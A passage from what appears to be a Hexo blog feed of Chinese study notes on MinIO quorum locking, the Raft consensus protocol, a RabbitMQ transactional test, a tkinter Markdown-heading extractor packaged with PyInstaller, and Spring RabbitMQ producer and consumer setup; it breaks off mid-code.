这种设计既能保证在网络分区或节点故障时仍能达成多数派共识，又避免了 Raft 那样的日志复制与状态机恢复开销。(<a href="https://github.com/minio/dsync/blob/master/README.md?utm_source=chatgpt.com" title="README.md - minio/dsync - GitHub">GitHub</a>)</p></li></ul></li><li><p><strong>读写流程中的多数派确认</strong></p><ul><li><p><strong>写入</strong>：当客户端 PUT&#x2F;DELETE 操作元数据或对象时，MinIO 会把数据切分（若启用了纠删码）、并行写入多块磁盘，再等待多数块写成功后才返回成功给客户端。</p></li><li><p><strong>读取</strong>：同样，从多数块中重建或直接读取，不依赖某个“主”节点。</p></li></ul></li><li><p><strong>为何不用 Raft？</strong><br> Raft 虽然可提供强一致性，但在需要超大规模（上千节点、上万磁盘）的高并发环境下，日志复制和领导者选举的开销会显著影响性能。MinIO 更追求极简、高效的读写路径，因此选择了基于 dsync 的 quorum 方案，而不是 Raft。</p></li></ol><hr><p><strong>小结</strong>：</p><ul><li><p>MinIO 的元数据同步并非通过 Raft 日志复制，而是把元数据当成普通对象写入磁盘，并依赖 <code>dsync</code> 分布式锁＋多数派确认来保证并发一致性。</p></li><li><p>不同节点之间无领导者（leader）；每个节点都可接受请求，只要多数派达成共识即可。</p></li></ul><p>这样既避免了单点，也能在极大规模下保持高性能。希望能解答你的疑惑！</p>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>对象存储</category>
      
      <category>Minio</category>
      
      <category>Minio 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Raft 协议</title>
    <link href="/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9ARaft%20%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9ARaft%20%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="1-Raft-协议概述"><a href="#1-Raft-协议概述" class="headerlink" title="1. Raft 协议概述"></a>1. Raft 协议概述</h3><p>Raft 是一种 分布式一致性协议中的强一致性的协议，用于在多台服务器（或节点）之间 保持数据一致性，即便有部分节点发生故障。它的出现是为了解决一个经典的问题：“我们有多个节点，如果有一个客户端对系统发起写入请求，我们怎么保证这些节点最终看到的是同一份数据？怎么能保证即使部分节点宕机，整个集群依然能保持数据一致、服务不中断。”</p><hr><h3 id="2-Raft-协议三个核心角色"><a href="#2-Raft-协议三个核心角色" class="headerlink" title="2. Raft 协议三个核心角色"></a>2. Raft 协议三个核心角色</h3><ol><li>&#x3D;&#x3D;Follower&#x3D;&#x3D;：<ol><li>安静等待 Leader 的指令</li></ol></li><li>&#x3D;&#x3D;Candidate&#x3D;&#x3D;：<ol><li>视图成为 Leader 的节点</li></ol></li><li>&#x3D;&#x3D;Leader&#x3D;&#x3D;：<ol><li>负责管理整个集群、处理客户端请求并同步日志</li></ol></li></ol><hr><h3 id="Raft-协议核心特性"><a href="#Raft-协议核心特性" class="headerlink" title="Raft 协议核心特性"></a>Raft 协议核心特性</h3><ol><li>&#x3D;&#x3D;多数投票选 Leader&#x3D;&#x3D;：<ol><li>启动时，所有节点默认处于 Follower 状态。</li><li>若某个 Follower 在选举超时时间内未收到 Leader 的心跳信号，则会升级为 Candidate 并主动发起投票。</li><li>一旦某个 Candidate 获得超过半数（即 &gt; N&#x2F;2）的节点投票，即可当选为 Leader。这种机制有效防止了脑裂问题。（为避免平票，建议集群中参与选举的节点数为奇数）</li><li>其他节点一旦接收到新 Leader 的心跳信号，便自动“认输”，继续担任 Follower。</li></ol></li><li>&#x3D;&#x3D;强一致日志复制&#x3D;&#x3D;：<ol><li>Leader 接收到客户端请求后，会先将日志条目同步给所有 Follower。只有在多数节点（超过半数）确认写入后，日志才视为“提交成功”。</li><li>一旦日志被提交，你可以确信：即使当前 Leader 崩溃，新选出的 Leader（同样来自多数派）也一定持有这条日志。</li><li>不必担心“落后节点”当选 Leader。在投票前，节点会先检查候选人的日志是否至少和自己一样新，才会投票。这就杜绝了日志落后的节点“混进多数”并被选为 Leader 的可能性。</li><li>至于那些日志未及时同步的节点，也无需担心：即使它们宕机或网络波动，恢复后也会自动检测日志落后，并向当前 Leader 请求补齐。</li><li>而我们的读和写都是由 Leader 进行完成，这样就保证了强一致性，但这也带来了 Leader 压力和性能瓶颈问题。感觉如果用什么措施缓解，就不是强一直性了</li></ol></li><li>&#x3D;&#x3D;明确的 Term（任期）概念&#x3D;&#x3D;：<ol><li>每一轮选举都有一个全局递增的 <code>term</code>，可以理解为 “现在掌权的是第几届村长”。该 term 保存在每个节点中，谁的 term 高，谁就拥有更高优先级，从而防止 “过时村长” 重新掌权。</li></ol></li><li>&#x3D;&#x3D;自动故障转移&#x3D;&#x3D;：<ol><li>如果 Leader 崩溃，Follower 会因为收不到心跳而自动发起新一轮选举。新 Leader 会基于现有日志无缝接管，集群能够自动恢复并继续提供服务。</li></ol></li></ol><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/aft%20%E5%8D%8F%E8%AE%AE/image-20250615095342892.png"></p><h3 id="深入理解-Term-的概念"><a href="#深入理解-Term-的概念" class="headerlink" title="深入理解 Term 的概念"></a>深入理解 Term 的概念</h3><ol><li>&#x3D;&#x3D;初始状态&#x3D;&#x3D;：<ol><li>假设集群中有 5 个具备选举资格的节点（A、B、C、D、E），要成为 Leader 需要获得多数票（≥3 票）。</li><li>此时 A 是当前的 Leader（term&#x3D;10），定期向 B、C、D、E 发送心跳信号。</li></ol></li><li>&#x3D;&#x3D;Leader A 宕机&#x3D;&#x3D;：<ol><li>A 宕机后，B、C、D、E 都不再收到心跳信号，触发各自的选举超时定时器（150–300 ms 随机）。</li><li><font color="#00b0f0">假如 B 最先超时未收到心跳</font>：<ol><li>B 超时在先（如 180 ms），检测到未收到心跳，便将 <code>term</code> 从 10 增加到 11，变为 Candidate。B 立即给自己投票（票数&#x3D;1），并向 C、D、E 以及已掉线的 A 广播 <code>RequestVote(term=11, candidateId=B, lastLog…)</code>。</li><li>C、D、E 收到 B 的请求后，发现请求中的 term&#x3D;11 比自己当前的 term&#x3D;10 更新，便更新 term → 11，切回 Follower 身份，检查 B 的日志无落后后，投票给 B。</li><li>B 收到来自 C 和 D 的投票（B 自己 + C + D &#x3D; 3 票），满足多数要求，成功当选为新 Leader（term&#x3D;11）。</li><li>B 立即向其他活跃节点（C、D、E）以及离线的 A 发送心跳 <code>AppendEntries(term=11)</code>。C、D、E 收到后重置选举定时器，保持 Follower 状态；</li><li>如果 A 之后恢复上线，它将收到 B 的心跳 RPC，并发现 term&#x3D;11 比自己的 term&#x3D;10 更新，于是更新自己的 term → 11，退回 Follower 状态，放弃原先的 Leader 身份。这样保证：一个处于旧 term 的节点无法参与当前任期的投票或发起选举，只有“意识到要进入新一届”的节点才能重新参选。</li></ol></li><li><font color="#00b0f0">假如 B、C 几乎同时超时未收到心跳</font>：<ol><li>若 B 和 C 的选举超时非常接近（如均为 180 ms 左右），两者几乎同时将 term 从 10 升为 11，变为 Candidate，并向其余节点广播 <code>RequestVote(term=11)</code>（B 向 A、C、D、E 发，C 向 A、B、D、E 发）。</li><li>假设 D 先收到 B 的请求，检查通过后将票投给 B，并更新 term → 11。</li><li>同时，E 先收到 C 的请求，也检查通过并投票给 C，更新 term → 11。</li><li>当 B 收到来自 C 的 <code>RequestVote(term=11)</code> 请求时，B 发现自己在当前 term（11）中已将票投给自己，因此拒绝给 C 投票。C 也是同理（只能投一次，投给自己就没办法投给别人了）</li><li>B 最终得票为自己 + D &#x3D; 2，C 得票为自己 + E &#x3D; 2，均未获得多数 → <strong>选票分裂（split vote）</strong>，本轮选举失败。</li><li>B、C、D、E 的选举超时器重新启动，等待下一轮触发。再次进入超时的节点将把 term 增加到 12 并发起新一轮选举，如此循环，直到有人获得多数票成功当选。term 会随着失败轮次不断累加。</li></ol></li></ol></li><li>&#x3D;&#x3D;A 节点重连&#x3D;&#x3D;：<ol><li>A 节点重启后，term 仍是 10。当它收到新 Leader（如 D）发来的心跳 <code>AppendEntries(term=11)</code> 后，立刻发现对方的 term 更新，于是更新自己的 term → 11，退回 Follower 身份，开始正常接受日志同步，重新与集群保持一致。</li></ol></li></ol><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/aft%20%E5%8D%8F%E8%AE%AE/image-20250615124445749.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>分布式与微服务</category>
      
      <category>分布式一致性协议</category>
      
      <category>Raft 协议</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 功能测试</title>
    <link href="/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Test</span><br><span class="hljs-variable">@Transactional</span><br><span class="hljs-variable">@Rollback</span>(value = false) <span class="hljs-comment">// juint 默认回滚事务，所以想提交事务就设置为false这是在juint 中，其他的可以不用</span><br>public void <span class="hljs-built_in">testSendMessageInTx</span>() &#123;<br>    <span class="hljs-comment">// 1、发送第一条消息</span><br>    <span class="hljs-selector-tag">rabbitTemplate</span><span class="hljs-selector-class">.convertAndSend</span>(EXCHANGE_NAME, ROUTING_KEY, <span class="hljs-string">&quot;I am a dragon(tx msg ~~~01)&quot;</span>);<br><br>    <span class="hljs-comment">// 2、抛出异常</span><br>    <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">&quot;do bad:&quot;</span> + <span class="hljs-number">10</span> / <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 3、发送第二条消息</span><br>    <span class="hljs-selector-tag">rabbitTemplate</span><span class="hljs-selector-class">.convertAndSend</span>(EXCHANGE_NAME, ROUTING_KEY, <span class="hljs-string">&quot;I am a dragon(tx msg ~~~02)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>程序测试</category>
      
      <category>功能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Md 分级标题 → Xmind 小工具</title>
    <link href="/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9AMd%20%E5%88%86%E7%BA%A7%E6%A0%87%E9%A2%98%20%E2%86%92%20Xmind%20%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/05/12/%E7%AC%94%E8%AE%B0%EF%BC%9AMd%20%E5%88%86%E7%BA%A7%E6%A0%87%E9%A2%98%20%E2%86%92%20Xmind%20%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h3 id="编写-Py-代码"><a href="#编写-Py-代码" class="headerlink" title="编写 Py 代码"></a>编写 Py 代码</h3><p>创建 <code>markdown_title_extractor.py</code> 并编写代码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import tkinter as tk<br><span class="hljs-keyword">from</span> tkinter import filedialog, messagebox<br>import os<br><br>class MarkdownTitleExtractor:<br>    def __init__(self, root):<br>        self.root = root<br>        self.root.title(<span class="hljs-string">&quot;Markdown 标题提取器&quot;</span>)<br>        self.root.geometry(<span class="hljs-string">&quot;620x150&quot;</span>)<br>        # 居中窗口<br>        self.root.eval(<span class="hljs-string">&#x27;tk::PlaceWindow . center&#x27;</span>)<br><br>        # 默认输出目录<br>        self.default_output_dir = r<span class="hljs-string">&quot;D:\文件集合&quot;</span><br><br>        # 输入文件选择<br>        tk.Label(root, <span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;输入 Markdown 文件：&quot;</span>).grid(row=0, <span class="hljs-attribute">column</span>=0, <span class="hljs-attribute">padx</span>=10, <span class="hljs-attribute">pady</span>=10, <span class="hljs-attribute">sticky</span>=<span class="hljs-string">&#x27;e&#x27;</span>)<br>        self.input_entry = tk.Entry(root, <span class="hljs-attribute">width</span>=50)<br>        self.input_entry.grid(<span class="hljs-attribute">row</span>=0, <span class="hljs-attribute">column</span>=1, <span class="hljs-attribute">padx</span>=10, <span class="hljs-attribute">pady</span>=10)<br>        tk.Button(root, <span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;选择文件&quot;</span>, <span class="hljs-attribute">command</span>=self.select_input).grid(row=0, <span class="hljs-attribute">column</span>=2, <span class="hljs-attribute">padx</span>=10)<br><br>        # 输出文件选择<br>        tk.Label(root, <span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;输出 Markdown 文件：&quot;</span>).grid(row=1, <span class="hljs-attribute">column</span>=0, <span class="hljs-attribute">padx</span>=10, <span class="hljs-attribute">pady</span>=10, <span class="hljs-attribute">sticky</span>=<span class="hljs-string">&#x27;e&#x27;</span>)<br>        self.output_entry = tk.Entry(root, <span class="hljs-attribute">width</span>=50)<br>        # 初始默认输出文件<br>        initial_out = os.path.join(self.default_output_dir, <span class="hljs-string">&quot;output.md&quot;</span>)<br>        self.output_entry.insert(0, initial_out)<br>        self.output_entry.grid(<span class="hljs-attribute">row</span>=1, <span class="hljs-attribute">column</span>=1, <span class="hljs-attribute">padx</span>=10, <span class="hljs-attribute">pady</span>=10)<br>        tk.Button(root, <span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;选择文件&quot;</span>, <span class="hljs-attribute">command</span>=self.select_output_file).grid(row=1, <span class="hljs-attribute">column</span>=2, <span class="hljs-attribute">padx</span>=10)<br><br>        # 提取标题按钮<br>        tk.Button(root, <span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;提取标题&quot;</span>, <span class="hljs-attribute">command</span>=self.extract_titles, <span class="hljs-attribute">width</span>=20).grid(row=2, <span class="hljs-attribute">column</span>=0, <span class="hljs-attribute">columnspan</span>=3, <span class="hljs-attribute">pady</span>=20)<br><br>    def select_input(self):<br>        # 默认打开指定目录<br>        default_dir = r<span class="hljs-string">&quot;E:\1、办公\4、博客\myNote\source\_posts&quot;</span><br>        file_path = filedialog.askopenfilename(<br>            <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;选择输入 Markdown 文件&quot;</span>,<br>            <span class="hljs-attribute">initialdir</span>=default_dir,<br>            filetypes=[(<span class="hljs-string">&quot;Markdown 文件&quot;</span>, <span class="hljs-string">&quot;*.md&quot;</span>), (<span class="hljs-string">&quot;所有文件&quot;</span>, <span class="hljs-string">&quot;*.*&quot;</span>)]<br>        )<br>        <span class="hljs-keyword">if</span> file_path:<br>            # 更新输入路径<br>            self.input_entry.delete(0, tk.END)<br>            self.input_entry.insert(0, file_path)<br>            # 根据输入文件名生成输出文件默认路径<br>            filename = os.path.basename(file_path)<br>            output_path = os.path.join(self.default_output_dir, filename)<br>            self.output_entry.delete(0, tk.END)<br>            self.output_entry.insert(0, output_path)<br><br>    def select_output_file(self):<br>        file_path = filedialog.asksaveasfilename(<br>            <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;选择输出 Markdown 文件&quot;</span>,<br>            <span class="hljs-attribute">initialdir</span>=self.default_output_dir,<br>            <span class="hljs-attribute">defaultextension</span>=<span class="hljs-string">&quot;.md&quot;</span>,<br>            filetypes=[(<span class="hljs-string">&quot;Markdown 文件&quot;</span>, <span class="hljs-string">&quot;*.md&quot;</span>), (<span class="hljs-string">&quot;所有文件&quot;</span>, <span class="hljs-string">&quot;*.*&quot;</span>)]<br>        )<br>        <span class="hljs-keyword">if</span> file_path:<br>            self.output_entry.delete(0, tk.END)<br>            self.output_entry.insert(0, file_path)<br><br>    def extract_titles(self):<br>        input_path = self.input_entry.<span class="hljs-built_in">get</span>().strip()<br>        output_file = self.output_entry.<span class="hljs-built_in">get</span>().strip()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> input_path <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> output_file:<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">&quot;请同时选择输入和输出文件路径！&quot;</span>)<br>            return<br><br>        try:<br>            with open(input_path, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as infile, \<br>                    open(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as outfile:<br>                outfile.write(<span class="hljs-string">&quot;# Map:\n\n&quot;</span>)<br>                in_code_block = <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> infile:<br>                    stripped = line.strip()<br>                    <span class="hljs-keyword">if</span> stripped.startswith(<span class="hljs-string">&#x27;```&#x27;</span>):<br>                        in_code_block = <span class="hljs-keyword">not</span> in_code_block<br>                        continue<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> in_code_block <span class="hljs-keyword">and</span> stripped.startswith(<span class="hljs-string">&#x27;#&#x27;</span>):<br>                        outfile.write(line)<br>            messagebox.showinfo(<span class="hljs-string">&quot;成功&quot;</span>, f<span class="hljs-string">&quot;标题提取成功！\n输出文件已保存到：&#123;output_file&#125;&quot;</span>)<br>        except Exception as e:<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, f<span class="hljs-string">&quot;发生错误：&#123;e&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    root = tk.Tk()<br>    app = MarkdownTitleExtractor(root)<br>    root.mainloop()<br></code></pre></td></tr></table></figure><hr><h3 id="打包为可执行文件"><a href="#打包为可执行文件" class="headerlink" title="打包为可执行文件"></a>打包为可执行文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller --onefile --windowed --distpath D:\文件集合\ D:\文件集合\markdown_title_extractor.py<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath D:\文件集合\</span><br><span class="hljs-string">1. 指定输出位置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>Md 分级标题 → Xmind 小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Data RabbitMQ</title>
    <link href="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/"/>
    <url>/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：Spring-Data-RabbitMQ"><a href="#1-导图：Map：Spring-Data-RabbitMQ" class="headerlink" title="1. 导图：Map：Spring Data RabbitMQ"></a>1. 导图：<a href="Map%EF%BC%9ASpringDataRabbitMQ.xmind">Map：Spring Data RabbitMQ</a></h3><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h3><h4 id="1-1-创建-Spring-Web-项目，添加-RabbitMQ-相关依赖"><a href="#1-1-创建-Spring-Web-项目，添加-RabbitMQ-相关依赖" class="headerlink" title="1.1. 创建 Spring Web 项目，添加 RabbitMQ 相关依赖"></a>1.1. 创建 Spring Web 项目，添加 RabbitMQ 相关依赖</h4><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;Messaging&#x3D;&#x3D;<ol><li>Spring for RabbitMQ</li></ol></li></ol><hr><h4 id="1-2-配置-RabbitMQ-连接"><a href="#1-2-配置-RabbitMQ-连接" class="headerlink" title="1.2. 配置 RabbitMQ 连接"></a>1.2. 配置 RabbitMQ 连接</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">spring:  <br>  rabbitmq:  <br>    host: 192.168.136.7  <br>    port: 5672                     # 不要写 15672<br>    username: guest  <br>    password: 123456  <br>    virtual-host: /                # RabbitMQ 的虚拟空间<br></code></pre></td></tr></table></figure><hr><h4 id="1-3-创建交换机和队列"><a href="#1-3-创建交换机和队列" class="headerlink" title="1.3. 创建交换机和队列"></a>1.3. 创建交换机和队列</h4><h5 id="1-3-1-创建交换机"><a href="#1-3-1-创建交换机" class="headerlink" title="1.3.1. 创建交换机"></a>1.3.1. 创建交换机</h5><p>这里创建的交换机名称为：<code>test.exchange</code>：<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511133233350.png" alt="|500"></p><hr><h5 id="1-3-2-创建队列"><a href="#1-3-2-创建队列" class="headerlink" title="1.3.2. 创建队列"></a>1.3.2. 创建队列</h5><p>这里创建的队列名称为：<code>test.queue</code>：<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511134249151.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>一致性是指多节点之间的数据一致</li><li>使用 <code>Stream</code> 还不如使用 <code>kafka</code></li><li><code>Classic</code> 和 <code>Quorum</code> 队列的区别：<ol><li><code>Classic</code> 队列的数据实际存储在一个节点上，虽然我们可以开启 镜像（mirrored queue） 模式，让它同步到其他节点，但这个机制是老的、高延迟的，并且不推荐再用了。</li><li><code>Quorum</code> 默认会有 3 个副本（可以配置），分布在不同节点上，所有写入操作必须经过 leader 副本，并复制给其他副本因此具有强一致性<ol><li>此外还能自动故障转移，不需要人工干预，但写性能会比 classic 低（因为需要复制和一致性保障）。</li><li>如果 Leader 宕机，会使用 <code>Raft</code> 协议自动从剩下的存活副本中重新选出一个新的 <code>Leader</code></li><li>假设你有 3 个副本：只要有 2 个副本存活，就能继续工作并选出新的 Leader。如果只剩下 1 个副本存活，对不起，不能选 Leader，队列就会挂起，直到 quorum 恢复。</li></ol></li></ol></li></ol></blockquote><hr><h5 id="1-3-3-将队列与交换机绑定"><a href="#1-3-3-将队列与交换机绑定" class="headerlink" title="1.3.3. 将队列与交换机绑定"></a>1.3.3. 将队列与交换机绑定</h5><p>将 <code>queue.direct.test</code> 队列与 <code>exchange.direct.test</code> 交换机绑定，使用路由键 <code>test</code>。这样，发送到 <code>exchange.direct.test</code> 且路由键为 <code>test</code> 的消息会被转发到 <code>queue.direct.test</code>。</p><p>注意：<strong>一个交换机可以绑定多个队列，一个队列也可以绑定多个交换机</strong></p><p>点击消息队列，进入其配置：<br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511134458564.png"></p><hr><h4 id="1-4-编写生产者代码"><a href="#1-4-编写生产者代码" class="headerlink" title="1.4. 编写生产者代码"></a>1.4. 编写生产者代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQProduce</span> &#123;  <br><br>    <span class="hljs-comment">// 交换机  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_DIRECT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;exchange.direct.test&quot;</span>;  <br>    <br>    <span class="hljs-comment">// 路由键  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test&quot;</span>;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.convertAndSend(<br>        EXCHANGE_DIRECT,  <br>                ROUTING_KEY,  <br>                <span class="hljs-string">&quot;first sent message!&quot;</span>,  <br>                message -&gt; &#123;  <br>                <span class="hljs-comment">// 设置消息属性</span><br>                .......<br>                    <span class="hljs-keyword">return</span> message;  <br>                &#125;,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;123456&quot;</span>));  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;发送成功&quot;</span>;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-5-编写消费者代码"><a href="#1-5-编写消费者代码" class="headerlink" title="1.5. 编写消费者代码"></a>1.5. 编写消费者代码</h4><p>需要注意的是：一个消费者可以监听多个队列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMWListener</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;queue.direct.test&quot;</span>;  <br>  <br>    <span class="hljs-meta">@RabbitListener(queues = &#123;QUEUE_NAME&#125;)</span>  